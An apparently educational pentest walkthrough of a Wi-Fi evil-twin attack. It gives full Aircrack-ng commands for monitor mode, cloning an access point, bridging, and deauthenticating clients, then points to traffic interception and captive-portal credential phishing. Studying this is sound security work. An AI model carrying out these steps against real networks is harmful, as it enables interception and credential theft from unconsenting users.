# Evil-Twin Attack



{% hint style="danger" %}
This is for educational purposes and only to be performed on networks you have permission to do so.
{% endhint %}

Basic info on Wireless can be found [here](../../../general/networking/wireless/).\
\
This will be a walkthrough on  performing an Evil-Twin wireless attack using [Aircrack-ng](../../../general/tools/wireless/aircrack-ng.md).

An evil twin is a fake wireless access point(AP) that looks like a real one. The concept is to set up a malicious wireless network with the same SSID name as the target.

This will require having a WiFi Adapter that supports monitor mode, also known as packet injection.

I myself have and recommend these adapters:

* [Alfa AWUS036ACM](https://www.amazon.com/Alfa-AWUS036ACM-Long-Range-Dual-Band-Wireless/dp/B073X6RL9D) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACHM](https://www.amazon.com/gp/product/B08SJBV1N3/ref=ox\_sc\_act\_title\_1?smid=A20G3A026MV70R\&psc=1) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACH](https://www.amazon.com/dp/B08SJC78FH?ref\_=cm\_sw\_r\_cp\_ud\_dp\_PSZZG6J9X0XH40GXB685) <-- Capable of 2.4GHz and 5GHz (This more than likely \*will\* require driver installation)
* [Panda Wireless PAU09 N600](https://www.amazon.com/Panda-Wireless-PAU09-Adapter-Antennas/dp/B01LY35HGO) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036NEH](https://www.amazon.com/AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter/dp/B0035OCVO6)
* [Alfa AWUS036NH](https://www.amazon.com/Alfa-AWUS036NH-802-11g-Wireless-Long-Range/dp/B003YIFHJY)
* [Panda Wireless PAU05](https://www.amazon.com/Panda-300Mbps-Wireless-USB-Adapter/dp/B00EQT0YK2)
* [TP-Link TL-WN722N](https://www.amazon.com/TP-Link-TL-WN722N-Wireless-network-Adapter/dp/B002SZEOLG)
* [Ralink USB WiFi RT5370](https://www.amazon.com/Ralink-RT5370-Raspberry-Adapter-Function/dp/B019XUDHFC)

You can also use a device such as [WiFi Pineapple](https://shop.hak5.org/products/wifi-pineapple).

## Setup

First we need to find the interface of our WiFi, using `iwconfig`. Mine is "wlan1" in this instance.

After we find that, we put it into monitor mode:

```
sudo airmon-ng start wlan1
```

<figure><img src="../../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

Notice it says "`monitor mode vif enables for [phy1]wlan1 on [phy1]wlan1mon`" - The interface is now wlan1mon instead of wlan1.

Now we find our target using `airodump`.

```
sudo airodump-ng wlan1mon
```

Mine will be "Pixel7" in this instance.

<figure><img src="../../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

## Creating the Evil-Twin

Now that we have our target, we can setup the Evil-Twin AP with `airbase`.

```
sudo airbase-ng -a (BSSID) --essid (essid) -c (channel#) (interface)
```

<figure><img src="../../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

### Bridge Setup

We will need to bridge adapters for this next step so if it's not already installed, install bridge-utils:

```
sudo apt install -y bridge-utils
```

We will also need to provide internet access to the Evil Twin to keep devices connected. Give it any name you want, I chose "evil".

```
brctl addbr evil
```

Notice when we created the Evil-Twin AP it created a tap interface of `at0`, we will need to bridge the created interfaces.

```
sudo brctl addif evil at0
```

Enable listening on interface `at0` and enable both `evil` and `at0` interfaces

```
sudo ifconfig at0 0.0.0.0 up
sudo ifconfig evil up
```

### Deauthentication

Our goal now is get clients to connect to our AP instead, so we need to deauth them from one they are connected to:

```
sudo aireplay-ng -0 10 -a (bssid) wlan1m0n
```

OR if we want to deauth a specific client:

```
sudo aireplay-ng -0 10 -a (bssid) -c (Client MAC Address) wlan1m0n
```

<figure><img src="../../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

Once a client connects, we will see the message "Client X associated (unencrypted) to ESSID (Chosen ESSID)"&#x20;

<figure><img src="../../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

### Post connection

Once they are connected, or even before, we can start intercepting traffic with whatever tools we want, like [Wireshark](../../../general/networking/wireshark.md), [tshark](https://www.wireshark.org/docs/man-pages/tshark.html), [tcpdump](https://www.tcpdump.org/), etc.

We can also target WiFi with security and setup [Captive Portals](https://en.wikipedia.org/wiki/Captive\_portal) that will require them to enter credentials for their home WiFi or a website like Google which is then given to us.
